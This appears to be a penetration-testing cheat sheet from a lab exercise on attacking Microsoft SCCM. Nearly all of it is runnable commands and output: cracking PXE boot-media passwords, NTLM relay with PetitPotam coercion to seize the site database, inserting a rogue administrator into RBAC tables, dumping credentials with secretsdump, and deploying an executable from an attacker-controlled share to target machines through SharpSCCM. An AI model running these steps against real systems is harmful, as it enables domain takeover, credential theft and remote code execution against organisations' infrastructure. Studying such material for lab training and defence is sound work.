---
description: System Center Configuration Manager
---

# SCCM

It enables centralized management of resources and systems. It offers functions, like installing and uninstalling applications, configuring network and application parameters, and deploying patches and updates.

{% hint style="info" %}
SCCM enables IT administrators to handle a wide range of tasks from a single platform.
{% endhint %}

### <mark style="color:yellow;">PXE initial access</mark>

The `Pre-Boot Execution Environment` (`PXE`) is a mechanism for booting a computer over the network.

```sh
python .\pxethief.py 2 172.50.0.30
```

if the output says User configured password detected we need to crack thet password. By getting the boot.var

```powershell-session
PS C:\Tools> tftp -i 172.50.0.30 GET "\SMSTemp\2024.05.19.13.06.09.0001.{48463D2D-ABD9-4697-8665-D75CDA255804}.boot.var" "2024.05.19.13.06.09.0001.{48463D2D-ABD9-4697-8665-D75CDA255804}.boot.var"
Successful transfer: 12776 bytes in 1 second(s), 12776 bytes/s
```

Then generate the hash with option 5

```powershell-session
PS C:\Tools> python .\pxethief.py 5 '.\2024.05.19.13.06.09.0001.{48463D2D-ABD9-4697-8665-D75CDA255804}.boot.var'
```

Crack the hash

<details>

<summary>Needed hashcat module</summary>

```
mczen@htb[/htb]$ cd hashcat_pxe/
mczen@htb[/htb]$ git clone https://github.com/hashcat/hashcat.git
mczen@htb[/htb]$ git clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
mczen@htb[/htb]$ cp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/
mczen@htb[/htb]$ cp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850* hashcat/OpenCL/
mczen@htb[/htb]$ cd hashcat
mczen@htb[/htb]$ git checkout -b v6.2.5 tags/v6.2.5 # change to 6.2.5
mczen@htb[/htb]$ make
```

</details>

```shell-session
hashcat/hashcat -m 19850 --force -a 0 hashcat/hash /usr/share/wordlists/rockyou.txt
```

Request boot media

```powershell-session
python .\pxethief.py 3 '.\2024.05.19.13.06.09.0001.{48463D2D-ABD9-4697-8665-D75CDA255804}.boot.var' "Password123!"
```

### <mark style="color:yellow;">SCCM Auditing</mark>

The [sccmhunter](https://github.com/garrettfoster13/sccmhunter) tool can perform multiple attack and enumeration operations. Below the find command which uses ldap to look for SCCM.

```shell-session
 proxychains4 -q python3 sccmhunter.py find -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10
```

For results

```shell-session
python3 sccmhunter.py show -all
```

Enumerate with smb module and save PXEboot variables

```shell-session
python3 sccmhunter.py smb -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10 -save
```

### <mark style="color:yellow;">SCCM Site Takeover</mark>

If main MSSQL server is hosted on a different server than SCCM. The SCCM server needs administrator access to the database server but with NTLM authentication its possible to relay, with SMB or MSSQL, in this case they are tricking the SCCM server to authenticate.

<details>

<summary>Setup impacket</summary>

```
git clone -q https://github.com/fortra/impacket
cd impacket 
python3 -m venv .impacket
source .impacket/bin/activate
mpython3 -m pip install .
```

</details>

Then start ntlmrelay

```sh
python3 examples/ntlmrelayx.py -t "mssql://172.50.0.30" -smb2support -socks
```

And coerce with PetitPotam

```sh
python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 10.10.14.207 172.50.0.21
```

The connect to database

```sh
proxychains4 -q python3 examples/mssqlclient.py 'LAB/SCCM01$'@172.50.0.30 -windows-auth -no-pass
```

List table with RBAC\_Admin

```shell-session
mczen@htb[/htb]# proxychains4 -q python3 examples/mssqlclient.py 'LAB/SCCM01$'@172.50.0.30 -windows-auth -no-pass
...SNIP...
SQL (LAB\SCCM01$  dbo@CM_HTB)> SELECT * FROM RBAC_Admins
 AdminID                                                      AdminSID   LogonName        DisplayName   IsGroup   IsDeleted   CreatedBy        CreatedDate   ModifiedBy       ModifiedDate   SourceSite   DistinguishedName                    AccountType   
--------   -----------------------------------------------------------   --------------   -----------   -------   ---------   --------------   -----------   --------------   ------------   ----------   ----------------------------------   -----------   
16777217   b'0105000000000005150000004b2233992a9592e9d78a99dab9040000'   LAB\sccm_admin   NULL                0           0   LAB\sccm_admin   2024-05-10 10:12:57   LAB\sccm_admin   2024-05-10 10:12:57   HTB          NULL                                        NULL   

16777222   b'0105000000000005150000004b2233992a9592e9d78a99daca040000'   LAB\rai          Rai MC              0           0   LAB\sccm_admin   2024-07-10 11:59:12   LAB\sccm_admin   2024-07-10 11:59:12   HTB          CN=Rai MC,CN=Users,DC=lab,DC=local             0
```

Then get the SID and convert to binary

```powershell
PS C:\Users\blwasp\Desktop> Get-DomainUser blwasp -Properties objectsid

objectsid
---------
S-1-5-21-2570265163-3918697770-3667495639-1103

# Create function
PS C:\Users\blwasp\Desktop> function Convert-StringSidToBinary {
>>  param (
>>  [Parameter(Mandatory=$true, Position=0)]
>>  [string]$StringSid
>>  )
>>
>>  $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid
>>  $binarySid = New-Object byte[] ($sid.BinaryLength)
>>  $sid.GetBinaryForm($binarySid, 0)
>>
>>  $binarySidHex = ($binarySid | ForEach-Object { $_.ToString("X2") }) -join ''
>>  echo "0x$($binarySidHex.ToLower())"
>> }

# Convert to binary
PS C:\Users\blwasp\Desktop> Convert-StringSidToBinary S-1-5-21-2570265163-3918697770-3667495639-1103
0x0105000000000005150000004b2233992a9592e9d78a99da4f040000
```

Insert a new administrator into RBAC\_Admins

```shell
# Use db
use CM_HTB;

# Insert new admin
SQL (LAB\SCCM01$  dbo@CM_HTB)> INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x0105000000000005150000004b2233992a9592e91111a99da4f040000,'LAB\blwasp',0,0,'','','','','HTB');

# Add rights
SQL (LAB\SCCM01$  dbo@CM_HTB)> INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777223,'SMS0001R','SMS00ALL','29');
SQL (LAB\SCCM01$  dbo@CM_HTB)> INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777223,'SMS0001R','SMS00001','1');
SQL (LAB\SCCM01$  dbo@CM_HTB)> INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777223,'SMS0001R','SMS00004','1');
```

## <mark style="color:yellow;">SCCM Site Takeover II</mark>

Like MSSQL, primary server account must be member of SMS Admins group. This group gives access to the WMI interfaces and AdminService API. If SMS provider is installed on another server and if the API accepts NTLM auth, is exposed on server carrying SMS provider its possible to relay.

```sh
# Run in venv
Import-Module .\PowerView.ps1
Get-DomainUser dario -Properties objectsid
python3 ntlmrelayx.py -t https://172.50.0.40/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "LAB\dario" --displayname "LAB\dario" --objectsid S-1-5-21-2570265163-3918697770-3667495639-2222

# Install relay-sccm-adminservice
git clone -b feature/relay-sccm-adminservice --single-branch https://github.com/garrettfoster13/impacket.git relay-sccm

# Target SMS_Admin
python3 examples/ntlmrelayx.py -t https://172.50.0.40/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "LAB\dario" --displayname "LAB\dario" --objectsid S-1-5-21-2570265163-3918697770-3667495639-1235

# Coerce
python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' PWNIP 172.50.0.21 

# Connect with sccmhunter
python3 sccmhunter.py admin -u dario -p 'Theman001' -ip 172.50.0.40
show_admins

# Get flag
runas /netonly /user:LAB\dario powershell
```

Or from a passive server

```sh
# Relay
ntlmrelayx.py -t 172.50.0.21 -smb2support -socks 

# Coerc
python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 10.10.14.207 172.50.0.22

# Dump
proxychains4 -q secretsdump.py 'LAB/SCCM02$'@172.50.0.21 -no-pass

# ADmin
python3 sccmhunter.py admin -u 'SCCM01$' -p aad3b435b51404eeaad3b435b51404ee:12287584ab4bb4ef1123f0ed2f08ff79 -ip 172.50.0.40

# Flag
proxychains -q smbclient.py 'LAB/SCCM01$'@172.50.0.10 -hashes aad3b435b51404eeaad3b435b51404ee:591f754ef48082f5fc4abec66c223d30
```

### <mark style="color:yellow;">SCCM Post Exploitation</mark>

SCCM can deploy applications and services on the AD, but also can be used to enumerate data. The service CMPivot can enumerate all the resources of a computer. For commands: [sccmhunter wiki](https://github.com/garrettfoster13/sccmhunter/wiki/admin).

```sh
# Get ID of resource
python3 sccmhunter.py admin -u rai -p 'Pxetesting01' -ip 172.50.0.40

# Get info target
() C:\ >> get_device SCCM-SMS
.\SharpSCCM.exe get devices -n SCCM-SMS -sms 172.50.0.40

# Interact target
() (C:\) >> interact 16777221

# Check administrators
(16777221) (C:\) >> administrators

# View files
(16777221) (C:\) >> ls

```

[SharpSCCM](https://github.com/Mayyhem/SharpSCCM) can help to enumerate and abuse SCCM infrastructure.

```powershell
# Check privileges
.\SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames -sms 172.50.0.40

# Search targets
.\SharpSCCM.exe get primary-users -u blwasp -sms 172.50.0.40

# LIst SCCM Devices
.\SharpSCCM.exe get devices -w "Active=1 and Client=1" -sms 172.50.0.40

# Create a new application
.\SharpSCCM.exe new application -s -n HTB_application -p \\10.10.14.207\share\test.exe -sms 172.50.0.40

# Create new device collection
.\SharpSCCM.exe new collection -n "new_collection" -t device -sms 172.50.0.40

# Add target computer to collection
.\SharpSCCM.exe new collection-member -d SRV01 -n "new_collection" -t device -sms 172.50.0.40

# Create new deployment
.\SharpSCCM.exe new deployment -a HTB_application -c "new_collection" -sms 172.50.0.40

# Wait for execution or try invoking
.\SharpSCCM.exe invoke update -n "new_collection" -sms 172.50.0.40

# Get hash on responder or HTTP relay
sudo responder -I tun0 -v -A
```

{% hint style="warning" %}
Applications take a long time to work. Scripts go faster.
{% endhint %}

As SCCM admin deploying scripts on a resource is possible with simple command:

```shell-session
whoami;hostname
```

Then in sccmhunter

```sh
# Enum machines within admin shell
() (C:\) >> get_device sccm01

# Promoto machine to full admin
(16777221) (C:\) >> get_device PWNED 

# Add admin
(16777221) (C:\) >> add_admin PWNED$ S-1-5-21-2570265163-3918697770-3667495639-1218

# New admin account is used as approval account.
python3 sccmhunter.py admin -u blwasp -p 'Password123!' -ip 172.50.0.40 -au 'PWNED$' -ap ComputerPass123

```
